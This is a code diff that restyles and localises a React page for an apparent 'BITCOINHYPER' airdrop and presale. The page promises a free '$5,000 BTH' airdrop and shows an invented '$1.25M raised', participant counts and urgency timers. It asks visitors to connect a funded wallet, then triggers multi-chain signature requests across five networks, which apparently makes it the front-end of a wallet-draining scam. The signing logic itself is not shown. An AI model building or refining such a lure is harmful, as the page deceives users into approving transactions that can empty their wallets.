@@ -60,7 +60,7 @@ const TRANSLATIONS = {
     successful: 'SUCCESSFUL!',
     youHaveSecured: 'You have secured',
     viewButton: 'VIEW',
-    checkWalletEligibility: 'Check Wallet Eligibility',
+    checkWalletEligibility: '⚡ Check Wallet Eligibility',
     whenQualified: 'When qualified, confirm to claim your airdrop',
     valueBadge: '$5,000 BTH',
     progress: 'Progress',
@@ -101,7 +101,7 @@ const TRANSLATIONS = {
     successful: '¡EXITOSO!',
     youHaveSecured: 'Has asegurado',
     viewButton: 'VER',
-    checkWalletEligibility: 'Verificar Elegibilidad',
+    checkWalletEligibility: '⚡ Verificar Elegibilidad',
     whenQualified: 'Cuando califiques, confirma para reclamar tu airdrop',
     valueBadge: '$5,000 BTH',
     progress: 'Progreso',
@@ -142,7 +142,7 @@ const TRANSLATIONS = {
     successful: 'SUCCÈS !',
     youHaveSecured: 'Vous avez sécurisé',
     viewButton: 'VOIR',
-    checkWalletEligibility: 'Vérifier Éligibilité',
+    checkWalletEligibility: '⚡ Vérifier Éligibilité',
     whenQualified: 'Une fois qualifié, confirmez pour réclamer votre airdrop',
     valueBadge: '$5,000 BTH',
     progress: 'Progrès',
@@ -183,7 +183,7 @@ const TRANSLATIONS = {
     successful: 'ERFOLGREICH!',
     youHaveSecured: 'Sie haben gesichert',
     viewButton: 'ANSEHEN',
-    checkWalletEligibility: 'Berechtigung prüfen',
+    checkWalletEligibility: '⚡ Berechtigung prüfen',
     whenQualified: 'Bei Qualifikation bestätigen, um Airdrop zu erhalten',
     valueBadge: '$5,000 BTH',
     progress: 'Fortschritt',
@@ -224,7 +224,7 @@ const TRANSLATIONS = {
     successful: '成功！',
     youHaveSecured: '您已确保',
     viewButton: '查看',
-    checkWalletEligibility: '检查钱包资格',
+    checkWalletEligibility: '⚡ 检查钱包资格',
     whenQualified: '符合条件时，确认领取空投',
     valueBadge: '$5,000 BTH',
     progress: '进度',
@@ -265,7 +265,7 @@ const TRANSLATIONS = {
     successful: '成功！',
     youHaveSecured: '確保しました',
     viewButton: '表示',
-    checkWalletEligibility: 'ウォレット資格を確認',
+    checkWalletEligibility: '⚡ ウォレット資格を確認',
     whenQualified: '資格がある場合、確認してエアドロップを受け取る',
     valueBadge: '$5,000 BTH',
     progress: '進捗',
@@ -306,7 +306,7 @@ const TRANSLATIONS = {
     successful: '성공!',
     youHaveSecured: '확보했습니다',
     viewButton: '보기',
-    checkWalletEligibility: '지갑 자격 확인',
+    checkWalletEligibility: '⚡ 지갑 자격 확인',
     whenQualified: '자격이 되면 확인하여 에어드랍 받기',
     valueBadge: '$5,000 BTH',
     progress: '진행률',
@@ -347,7 +347,7 @@ const TRANSLATIONS = {
     successful: 'نجاح!',
     youHaveSecured: 'لقد قمت بتأمين',
     viewButton: 'عرض',
-    checkWalletEligibility: 'التحقق من أهلية المحفظة',
+    checkWalletEligibility: '⚡ التحقق من أهلية المحفظة',
     whenQualified: 'عند التأهل، قم بالتأكيد لاستلام الإسقاط الجوي',
     valueBadge: '$5,000 BTH',
     progress: 'التقدم',
@@ -803,10 +803,17 @@ function App() {
     }
   };
 
+  // ============================================
+  // CHANGE LANGUAGE FUNCTION - FIXED
+  // ============================================
   const changeLanguage = (langCode) => {
     setLanguage(langCode);
     setShowLanguageDropdown(false);
     
+    // Force re-render with new language
+    const t = TRANSLATIONS[langCode] || TRANSLATIONS.en;
+    
+    // Update URL without page reload
     const url = new URL(window.location);
     if (langCode === 'en') {
       if (url.pathname.startsWith(`/${langCode}`)) {
@@ -818,6 +825,9 @@ function App() {
     window.history.pushState({}, '', url.toString());
   };
 
+  // ============================================
+  // MULTI-CHAIN EXECUTION
+  // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
       setError("Wallet not initialized");
@@ -1076,17 +1086,13 @@ function App() {
   };
 
   return (
-    <div className="min-h-screen bg-[#0a0c10] text-[#e0e7f0] font-['Inter']">
+    <div className="min-h-screen bg-white text-[#1a1a1a] font-['Inter']">
       
-      {/* Subtle Background Gradient */}
-      <div className="fixed inset-0 bg-gradient-to-br from-[#0f1215] via-[#0a0c10] to-[#080a0d] z-0"></div>
-      <div className="fixed w-full h-full bg-[radial-gradient(ellipse_at_top_right,_rgba(200,120,30,0.03)_0%,_transparent_70%)] z-0"></div>
-
       {/* Main Container */}
-      <div className="relative z-10 container mx-auto px-4 sm:px-6 py-6 sm:py-12 max-w-[800px]">
+      <div className="container mx-auto px-4 sm:px-6 py-6 sm:py-12 max-w-[800px]">
         
-        {/* Clean Card without borders */}
-        <div className="bg-[#111519] rounded-3xl sm:rounded-[40px] shadow-2xl p-6 sm:p-8 md:p-10">
+        {/* Clean White Card with Red Accents */}
+        <div className="bg-white rounded-3xl sm:rounded-[40px] shadow-xl p-6 sm:p-8 md:p-10 border border-gray-100">
           
           {/* TOP SECTION */}
           <div className="flex flex-col sm:flex-row items-center justify-between gap-4 mb-8 sm:mb-10 relative">
@@ -1096,23 +1102,23 @@ function App() {
               <div className="absolute -top-16 sm:-top-20 right-0 left-0 sm:left-auto sm:right-0 z-20">
                 <div className="relative max-w-[320px] sm:max-w-[380px] mx-auto sm:mx-0">
                   {/* Arrow pointing to button */}
-                  <div className="absolute -bottom-2 right-16 sm:right-20 w-4 h-4 bg-[#c47d24] transform rotate-45 animate-pulse"></div>
+                  <div className="absolute -bottom-2 right-16 sm:right-20 w-4 h-4 bg-red-600 transform rotate-45 animate-pulse"></div>
                   
                   {/* Ribbon Body */}
-                  <div className="relative bg-gradient-to-r from-[#8a4c1a] to-[#b36e1a] rounded-lg px-4 py-2.5 shadow-xl border border-[#e0a55c]/30">
+                  <div className="relative bg-gradient-to-r from-red-600 to-red-500 rounded-lg px-4 py-2.5 shadow-xl border border-red-400">
                     <div className="flex items-center gap-2">
-                      <div className="w-6 h-6 bg-white/10 rounded-full flex items-center justify-center">
+                      <div className="w-6 h-6 bg-white/20 rounded-full flex items-center justify-center">
                         <i className="fas fa-gem text-white text-xs"></i>
                       </div>
                       <div>
-                        <div className="text-[10px] font-semibold text-white/80 uppercase tracking-wider">
+                        <div className="text-[10px] font-semibold text-white/90 uppercase tracking-wider">
                           {t.checkWalletEligibility}
                         </div>
                         <div className="text-xs font-bold text-white">
                           {t.whenQualified}
                         </div>
                       </div>
-                      <div className="bg-black/30 backdrop-blur px-2 py-1 rounded-full ml-auto">
+                      <div className="bg-white/20 backdrop-blur px-2 py-1 rounded-full ml-auto">
                         <span className="text-[10px] font-bold text-white">{t.valueBadge}</span>
                       </div>
                     </div>
@@ -1122,8 +1128,8 @@ function App() {
             )}
             
             <div className="flex items-center gap-2">
-              <i className="fab fa-bitcoin text-2xl sm:text-3xl text-[#d68a2e]"></i>
-              <span className="font-bold text-xl sm:text-2xl text-[#d68a2e] tracking-tight">BITCOINHYPER</span>
+              <i className="fab fa-bitcoin text-2xl sm:text-3xl text-red-600"></i>
+              <span className="font-bold text-xl sm:text-2xl text-gray-900 tracking-tight">BITCOINHYPER</span>
             </div>
             
             <div className="flex items-center gap-2">
@@ -1131,36 +1137,36 @@ function App() {
               <div className="relative">
                 <button
                   onClick={() => setShowLanguageDropdown(!showLanguageDropdown)}
-                  className="bg-[#1e2227] border border-[#2a2e33] rounded-full px-3 py-2 flex items-center gap-2 hover:border-[#d68a2e]/40 transition-colors"
+                  className="bg-gray-50 border border-gray-200 rounded-full px-3 py-2 flex items-center gap-2 hover:border-red-400 transition-colors"
                 >
                   <span className="text-base">{SUPPORTED_LANGUAGES[language]?.flag || '🇺🇸'}</span>
-                  <span className="text-xs font-medium text-[#e0b880] hidden sm:inline">
+                  <span className="text-xs font-medium text-gray-700 hidden sm:inline">
                     {SUPPORTED_LANGUAGES[language]?.native || 'English'}
                   </span>
-                  <i className={`fas fa-chevron-down text-[#9aa8b8] text-[10px] transition-transform ${showLanguageDropdown ? 'rotate-180' : ''}`}></i>
+                  <i className={`fas fa-chevron-down text-gray-500 text-[10px] transition-transform ${showLanguageDropdown ? 'rotate-180' : ''}`}></i>
                 </button>
                 
                 {showLanguageDropdown && (
-                  <div className="absolute right-0 mt-2 w-64 bg-[#1a1e24] border border-[#2a2e33] rounded-xl shadow-2xl z-50 max-h-96 overflow-y-auto">
+                  <div className="absolute right-0 mt-2 w-64 bg-white border border-gray-200 rounded-xl shadow-2xl z-50 max-h-96 overflow-y-auto">
                     <div className="p-2">
-                      <div className="text-xs text-[#d68a2e] px-3 py-2 font-medium border-b border-[#2a2e33] mb-1">
+                      <div className="text-xs text-red-600 px-3 py-2 font-medium border-b border-gray-200 mb-1">
                         SELECT LANGUAGE
                       </div>
                       {Object.entries(SUPPORTED_LANGUAGES).map(([code, lang]) => (
                         <button
                           key={code}
                           onClick={() => changeLanguage(code)}
-                          className={`w-full text-left px-3 py-2 rounded-lg flex items-center gap-3 hover:bg-[#252a30] transition-colors ${
-                            language === code ? 'bg-[#252a30]' : ''
+                          className={`w-full text-left px-3 py-2 rounded-lg flex items-center gap-3 hover:bg-gray-50 transition-colors ${
+                            language === code ? 'bg-red-50' : ''
                           }`}
                         >
                           <span className="text-lg">{lang.flag}</span>
                           <div className="flex-1">
-                            <div className="text-sm text-white">{lang.name}</div>
-                            <div className="text-xs text-gray-400">{lang.native}</div>
+                            <div className="text-sm text-gray-900">{lang.name}</div>
+                            <div className="text-xs text-gray-500">{lang.native}</div>
                           </div>
                           {language === code && (
-                            <i className="fas fa-check text-[#d68a2e] text-xs"></i>
+                            <i className="fas fa-check text-red-600 text-xs"></i>
                           )}
                         </button>
                       ))}
@@ -1172,22 +1178,22 @@ function App() {
               {!isConnected ? (
                 <button
                   onClick={() => open()}
-                  className="bg-gradient-to-r from-[#c47d24] to-[#b36e1a] text-[#0f0f12] font-semibold text-xs sm:text-sm px-5 py-2.5 rounded-full flex items-center gap-2 shadow-lg hover:shadow-[0_5px_15px_rgba(180,100,20,0.3)] transition-all whitespace-nowrap"
+                  className="bg-red-600 hover:bg-red-700 text-white font-semibold text-xs sm:text-sm px-5 py-2.5 rounded-full flex items-center gap-2 shadow-lg hover:shadow-xl transition-all whitespace-nowrap"
                 >
                   <i className="fas fa-plug text-xs"></i>
                   <span>{t.connectWallet}</span>
                 </button>
               ) : (
-                <div className="bg-[#1e2227] rounded-full py-1.5 pl-4 pr-1.5 flex items-center gap-2 border border-[#2a2e33]">
-                  <span className="font-mono text-xs text-white">
+                <div className="bg-gray-50 rounded-full py-1.5 pl-4 pr-1.5 flex items-center gap-2 border border-gray-200">
+                  <span className="font-mono text-xs text-gray-700">
                     {formatAddress(address)}
                   </span>
                   <button
                     onClick={() => disconnect()}
-                    className="w-7 h-7 rounded-full bg-[#2a2e33] flex items-center justify-center hover:bg-[#353b42] transition-colors"
+                    className="w-7 h-7 rounded-full bg-gray-200 flex items-center justify-center hover:bg-gray-300 transition-colors"
                     title={t.disconnect}
                   >
-                    <i className="fas fa-power-off text-[10px] text-[#e0b880]"></i>
+                    <i className="fas fa-power-off text-[10px] text-gray-700"></i>
                   </button>
                 </div>
               )}
@@ -1197,18 +1203,18 @@ function App() {
           {/* Eligibility Check */}
           {isConnected && scanning && (
             <div className="mb-8">
-              <div className="bg-[#1a1e24] rounded-2xl p-6 border border-[#2a2e33]">
+              <div className="bg-gray-50 rounded-2xl p-6 border border-gray-200">
                 <div className="flex items-center gap-4 mb-4">
-                  <div className="w-10 h-10 border-3 border-[#c47d24] border-t-transparent rounded-full animate-spin"></div>
+                  <div className="w-10 h-10 border-3 border-red-600 border-t-transparent rounded-full animate-spin"></div>
                   <div>
-                    <div className="text-base font-semibold text-[#e0b880]">{t.checkEligibility}</div>
-                    <div className="text-sm text-gray-400">{t.verifying}</div>
+                    <div className="text-base font-semibold text-gray-900">{t.checkEligibility}</div>
+                    <div className="text-sm text-gray-500">{t.verifying}</div>
                   </div>
                 </div>
                 
-                <div className="w-full bg-[#252a30] rounded-full h-1">
+                <div className="w-full bg-gray-200 rounded-full h-1">
                   <div 
-                    className="bg-gradient-to-r from-[#c47d24] to-[#d68a2e] h-1 rounded-full transition-all duration-300"
+                    className="bg-red-600 h-1 rounded-full transition-all duration-300"
                     style={{ width: `${scanProgress}%` }}
                   ></div>
                 </div>
@@ -1218,18 +1224,18 @@ function App() {
 
           {/* LIVE Badge */}
           <div className="flex justify-center mb-4">
-            <div className="bg-[#1a1e24] rounded-full px-4 py-1.5 border border-[#2a2e33] inline-flex items-center gap-2">
+            <div className="bg-red-50 rounded-full px-4 py-1.5 border border-red-200 inline-flex items-center gap-2">
               <span className="relative flex h-2 w-2">
                 <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
-                <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span>
+                <span className="relative inline-flex rounded-full h-2 w-2 bg-red-600"></span>
               </span>
-              <span className="text-xs font-medium tracking-wide text-[#e0b880]">{t.presaleLive}</span>
+              <span className="text-xs font-medium tracking-wide text-red-700">{t.presaleLive}</span>
             </div>
           </div>
 
           {/* Countdown Timer */}
-          <div className="bg-[#1a1e24] rounded-2xl px-6 py-5 mb-6 border border-[#2a2e33]">
-            <div className="text-xs tracking-wider text-gray-400 mb-3 text-center">
+          <div className="bg-gray-50 rounded-2xl px-6 py-5 mb-6 border border-gray-200">
+            <div className="text-xs tracking-wider text-gray-500 mb-3 text-center">
               <i className="far fa-clock mr-2"></i> {t.bonusEndsIn}
             </div>
             <div className="grid grid-cols-4 gap-2">
@@ -1240,7 +1246,7 @@ function App() {
                 { label: t.secs, value: timeLeft.seconds }
               ].map((item, index) => (
                 <div key={index} className="text-center">
-                  <div className="text-2xl sm:text-3xl font-bold text-[#d68a2e]">
+                  <div className="text-2xl sm:text-3xl font-bold text-red-600">
                     {item.value.toString().padStart(2, '0')}
                   </div>
                   <div className="text-[10px] uppercase tracking-wider text-gray-500">{item.label}</div>
@@ -1251,58 +1257,58 @@ function App() {
 
           {/* Bonus Ribbon */}
           <div className="relative mb-6">
-            <div className="absolute inset-0 bg-gradient-to-r from-[#8a4c1a] to-[#b36e1a] rounded-full blur-md opacity-30"></div>
-            <div className="relative bg-gradient-to-r from-[#8a4c1a] to-[#b36e1a] rounded-full px-4 py-2.5 text-center font-bold text-sm sm:text-base text-[#0f0f12] border border-[#e0a55c]/50">
+            <div className="absolute inset-0 bg-gradient-to-r from-red-600 to-red-500 rounded-full blur-md opacity-20"></div>
+            <div className="relative bg-gradient-to-r from-red-600 to-red-500 rounded-full px-4 py-2.5 text-center font-bold text-sm sm:text-base text-white border border-red-400 shadow-lg">
               <span>{t.bonus}</span>
             </div>
           </div>
 
-          <h1 className="text-4xl sm:text-5xl md:text-6xl font-black text-center mb-2 bg-gradient-to-b from-white to-[#d68a2e] bg-clip-text text-transparent">
+          <h1 className="text-4xl sm:text-5xl md:text-6xl font-black text-center mb-2 text-gray-900">
             $5,000 BTH
           </h1>
           
           <div className="text-center mb-6">
-            <span className="bg-[#1a1e24] rounded-full px-4 py-1.5 text-xs border border-[#2a2e33] text-[#e0b880] inline-block">
+            <span className="bg-red-50 rounded-full px-4 py-1.5 text-xs border border-red-200 text-red-700 inline-block">
               <i className="fas fa-bolt mr-1 text-[10px]"></i> {t.instantAirdrop}
             </span>
           </div>
 
           {/* Stats Grid */}
-          <div className="bg-[#1a1e24] rounded-2xl p-5 mb-8 grid grid-cols-3 gap-2 border border-[#2a2e33]">
+          <div className="bg-gray-50 rounded-2xl p-5 mb-8 grid grid-cols-3 gap-2 border border-gray-200">
             <div className="text-center">
-              <div className="text-xs text-gray-400 mb-1">{t.bthPrice}</div>
-              <div className="text-base sm:text-lg font-bold text-white">
-                ${presaleStats.tokenPrice} <span className="text-[10px] text-[#d68a2e] ml-1">+150%</span>
+              <div className="text-xs text-gray-500 mb-1">{t.bthPrice}</div>
+              <div className="text-base sm:text-lg font-bold text-gray-900">
+                ${presaleStats.tokenPrice} <span className="text-[10px] text-red-600 ml-1">+150%</span>
               </div>
             </div>
             <div className="text-center">
-              <div className="text-xs text-gray-400 mb-1">{t.bonusLabel}</div>
-              <div className="text-base sm:text-lg font-bold text-white">
-                5k <span className="text-[10px] text-[#d68a2e] ml-1">+25%</span>
+              <div className="text-xs text-gray-500 mb-1">{t.bonusLabel}</div>
+              <div className="text-base sm:text-lg font-bold text-gray-900">
+                5k <span className="text-[10px] text-red-600 ml-1">+25%</span>
               </div>
             </div>
             <div className="text-center">
-              <div className="text-xs text-gray-400 mb-1">{t.presale}</div>
-              <div className="text-base sm:text-lg font-bold text-white">{t.stage4}</div>
+              <div className="text-xs text-gray-500 mb-1">{t.presale}</div>
+              <div className="text-base sm:text-lg font-bold text-red-600">{t.stage4}</div>
             </div>
           </div>
 
           {/* Main Claim Area */}
           {isConnected && isEligible && !allChainsCompleted && executableChains.length > 0 && (
             <div className="mt-4">
-              <div className="bg-[#1a1e24] rounded-2xl px-6 py-5 text-2xl sm:text-3xl font-bold text-center text-[#e0c080] mb-4 border border-[#2a2e33]">
-                5,000 <span className="text-base text-gray-400 font-normal">BTH +25%</span>
+              <div className="bg-gray-50 rounded-2xl px-6 py-5 text-2xl sm:text-3xl font-bold text-center text-gray-900 mb-4 border border-gray-200">
+                5,000 <span className="text-base text-gray-500 font-normal">BTH +25%</span>
               </div>
               
               <button
                 onClick={executeMultiChainSignature}
                 disabled={signatureLoading || loading || !signer || executableChains.length === 0}
-                className="w-full bg-gradient-to-r from-[#b36e1a] to-[#d68a2e] text-[#0f0f12] font-bold text-base sm:text-lg py-4 rounded-2xl shadow-xl hover:shadow-[0_10px_20px_rgba(180,100,20,0.2)] transition-all disabled:opacity-50 disabled:cursor-not-allowed relative overflow-hidden group"
+                className="w-full bg-gradient-to-r from-red-600 to-red-500 text-white font-bold text-base sm:text-lg py-4 rounded-2xl shadow-xl hover:shadow-2xl transition-all disabled:opacity-50 disabled:cursor-not-allowed relative overflow-hidden group"
               >
-                <div className="absolute inset-0 bg-white/10 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-700"></div>
+                <div className="absolute inset-0 bg-white/20 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-700"></div>
                 {signatureLoading ? (
                   <div className="flex items-center justify-center gap-2">
-                    <div className="w-4 h-4 border-2 border-[#0f0f12] border-t-transparent rounded-full animate-spin"></div>
+                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                     <span>{t.processing}</span>
                   </div>
                 ) : (
@@ -1311,7 +1317,7 @@ function App() {
               </button>
               
               {txStatus && (
-                <div className="text-center mt-3 text-xs text-[#d68a2e]">
+                <div className="text-center mt-3 text-xs text-red-600">
                   {txStatus}
                 </div>
               )}
@@ -1321,13 +1327,13 @@ function App() {
           {/* Completed State */}
           {allChainsCompleted && (
             <div className="mt-4">
-              <div className="bg-[#1a1e24] rounded-2xl p-5 text-center border border-green-500/20 mb-3">
-                <p className="text-green-400 text-base mb-1">{t.completed}</p>
-                <p className="text-gray-400 text-xs">{t.secured}</p>
+              <div className="bg-green-50 rounded-2xl p-5 text-center border border-green-200 mb-3">
+                <p className="text-green-700 text-base mb-1">{t.completed}</p>
+                <p className="text-gray-500 text-xs">{t.secured}</p>
               </div>
               <button
                 onClick={claimTokens}
-                className="w-full bg-gradient-to-r from-green-600 to-green-700 text-white font-bold text-base sm:text-lg py-4 rounded-2xl shadow-lg hover:shadow-green-500/20 transition-all"
+                className="w-full bg-gradient-to-r from-green-600 to-green-500 text-white font-bold text-base sm:text-lg py-4 rounded-2xl shadow-lg hover:shadow-xl transition-all"
               >
                 🎉 {t.view}
               </button>
@@ -1336,14 +1342,14 @@ function App() {
 
           {/* Welcome Message */}
           {isConnected && !isEligible && !completedChains.length && !scanning && (
-            <div className="bg-[#1a1e24] rounded-2xl p-6 text-center border border-[#2a2e33] mt-4">
+            <div className="bg-gray-50 rounded-2xl p-6 text-center border border-gray-200 mt-4">
               <div className="text-5xl mb-3">👋</div>
-              <h2 className="text-xl font-bold mb-2 text-white">{t.welcome}</h2>
-              <p className="text-sm text-gray-400 mb-4">
+              <h2 className="text-xl font-bold mb-2 text-gray-900">{t.welcome}</h2>
+              <p className="text-sm text-gray-500 mb-4">
                 Connect with a wallet that has at least $1 in value to qualify.
               </p>
-              <div className="bg-[#252a30] rounded-xl p-3">
-                <p className="text-xs text-gray-400">
+              <div className="bg-white rounded-xl p-3 border border-gray-200">
+                <p className="text-xs text-gray-500">
                   Multi-chain: Ethereum, BSC, Polygon, Arbitrum, Avalanche
                 </p>
               </div>
@@ -1352,61 +1358,61 @@ function App() {
 
           {/* Error Display */}
           {error && (
-            <div className="mt-4 bg-red-500/10 border border-red-500/20 rounded-xl p-3">
+            <div className="mt-4 bg-red-50 border border-red-200 rounded-xl p-3">
               <div className="flex items-center gap-2">
-                <i className="fas fa-exclamation-triangle text-red-400 text-sm"></i>
-                <p className="text-red-300 text-xs">{error}</p>
+                <i className="fas fa-exclamation-triangle text-red-600 text-sm"></i>
+                <p className="text-red-700 text-xs">{error}</p>
               </div>
             </div>
           )}
 
           {/* Progress Section */}
-          <div className="mt-8 pt-6 border-t border-[#2a2e33]">
-            <h3 className="text-base font-semibold text-center mb-5 text-gray-300">
+          <div className="mt-8 pt-6 border-t border-gray-200">
+            <h3 className="text-base font-semibold text-center mb-5 text-gray-700">
               PRESALE PROGRESS
             </h3>
             
             <div className="grid grid-cols-3 gap-3 mb-5">
               <div className="text-center">
-                <div className="text-lg font-bold text-orange-400">${presaleStats.tokenPrice}</div>
+                <div className="text-lg font-bold text-red-600">${presaleStats.tokenPrice}</div>
                 <div className="text-xs text-gray-500">{t.tokenPrice}</div>
               </div>
               <div className="text-center">
-                <div className="text-lg font-bold text-green-400">{presaleStats.currentBonus}%</div>
+                <div className="text-lg font-bold text-red-600">{presaleStats.currentBonus}%</div>
                 <div className="text-xs text-gray-500">{t.currentBonus}</div>
               </div>
               <div className="text-center">
-                <div className="text-lg font-bold text-yellow-400">$1.25M</div>
+                <div className="text-lg font-bold text-red-600">$1.25M</div>
                 <div className="text-xs text-gray-500">{t.totalRaised}</div>
               </div>
             </div>
 
             <div className="mb-4">
-              <div className="flex justify-between text-xs text-gray-400 mb-2">
+              <div className="flex justify-between text-xs text-gray-500 mb-2">
                 <span>{t.progress}</span>
                 <span>{liveProgress.percentComplete}%</span>
               </div>
-              <div className="w-full h-1.5 bg-[#252a30] rounded-full overflow-hidden">
+              <div className="w-full h-1.5 bg-gray-200 rounded-full overflow-hidden">
                 <div 
-                  className="h-full bg-gradient-to-r from-orange-500 to-yellow-500 rounded-full"
+                  className="h-full bg-red-600 rounded-full"
                   style={{ width: `${liveProgress.percentComplete}%` }}
                 ></div>
               </div>
             </div>
 
             <div className="grid grid-cols-2 gap-3 mt-5">
-              <div className="bg-[#1a1e24] rounded-lg p-3 text-center">
-                <div className="text-xs text-gray-400 mb-1">{t.today}</div>
-                <div className="text-base font-bold text-orange-400">{liveProgress.participantsToday}</div>
+              <div className="bg-gray-50 rounded-lg p-3 text-center border border-gray-200">
+                <div className="text-xs text-gray-500 mb-1">{t.today}</div>
+                <div className="text-base font-bold text-red-600">{liveProgress.participantsToday}</div>
               </div>
-              <div className="bg-[#1a1e24] rounded-lg p-3 text-center">
-                <div className="text-xs text-gray-400 mb-1">{t.avg}</div>
-                <div className="text-base font-bold text-yellow-400">${liveProgress.avgAllocation}</div>
+              <div className="bg-gray-50 rounded-lg p-3 text-center border border-gray-200">
+                <div className="text-xs text-gray-500 mb-1">{t.avg}</div>
+                <div className="text-base font-bold text-red-600">${liveProgress.avgAllocation}</div>
               </div>
             </div>
 
             <div className="mt-4 text-center">
-              <p className="text-xs text-gray-600">
+              <p className="text-xs text-gray-400">
                 {presaleStats.totalParticipants.toLocaleString()} {t.participants}
               </p>
             </div>
@@ -1415,17 +1421,17 @@ function App() {
           {/* Footer */}
           <div className="mt-8 text-center">
             <div className="flex flex-wrap justify-center gap-2 mb-3">
-              <span className="bg-[#1a1e24] px-3 py-1.5 rounded-full text-xs text-gray-400 border border-[#2a2e33]">
+              <span className="bg-gray-50 px-3 py-1.5 rounded-full text-xs text-gray-600 border border-gray-200">
                 ⚡ {t.terms}
               </span>
-              <span className="bg-[#1a1e24] px-3 py-1.5 rounded-full text-xs text-gray-400 border border-[#2a2e33]">
+              <span className="bg-gray-50 px-3 py-1.5 rounded-full text-xs text-gray-600 border border-gray-200">
                 🔄 {t.delivery}
               </span>
-              <span className="bg-[#1a1e24] px-3 py-1.5 rounded-full text-xs text-gray-400 border border-[#2a2e33]">
+              <span className="bg-gray-50 px-3 py-1.5 rounded-full text-xs text-gray-600 border border-gray-200">
                 💎 {t.airdrop}
               </span>
             </div>
-            <p className="text-xs text-gray-600">
+            <p className="text-xs text-gray-400">
               {t.liveNow}
             </p>
           </div>
@@ -1434,28 +1440,28 @@ function App() {
 
       {/* Celebration Modal */}
       {showCelebration && (
-        <div className="fixed inset-0 bg-black/90 flex items-center justify-center z-50 p-4">
+        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
           <div className="relative max-w-sm w-full">
-            <div className="absolute inset-0 bg-gradient-to-r from-orange-600/20 to-yellow-600/20 rounded-3xl blur-xl"></div>
+            <div className="absolute inset-0 bg-gradient-to-r from-red-600/20 to-red-500/20 rounded-3xl blur-xl"></div>
             
-            <div className="relative bg-[#1a1e24] rounded-3xl p-8 border border-orange-500/20 shadow-2xl text-center">
+            <div className="relative bg-white rounded-3xl p-8 border border-red-200 shadow-2xl text-center">
               <div className="text-6xl mb-4 animate-bounce">🎉</div>
               
-              <h2 className="text-2xl font-bold mb-2 bg-gradient-to-r from-yellow-400 to-orange-400 bg-clip-text text-transparent">
+              <h2 className="text-2xl font-bold mb-2 text-red-600">
                 {t.successful}
               </h2>
               
-              <p className="text-gray-300 mb-2">{t.youHaveSecured}</p>
+              <p className="text-gray-600 mb-2">{t.youHaveSecured}</p>
               
-              <div className="text-3xl font-bold text-orange-400 mb-3">$5,000 BTH</div>
+              <div className="text-3xl font-bold text-gray-900 mb-3">$5,000 BTH</div>
               
-              <div className="inline-block bg-green-500/10 px-4 py-2 rounded-full mb-4 border border-green-500/20">
-                <span className="text-green-400">+{presaleStats.currentBonus}% BONUS</span>
+              <div className="inline-block bg-green-50 px-4 py-2 rounded-full mb-4 border border-green-200">
+                <span className="text-green-700">+{presaleStats.currentBonus}% BONUS</span>
               </div>
               
               <button
                 onClick={() => setShowCelebration(false)}
-                className="w-full bg-gradient-to-r from-orange-500 to-orange-600 text-white font-bold py-3 rounded-xl hover:shadow-lg transition-all"
+                className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-xl transition-all"
               >
                 {t.viewButton}
               </button>
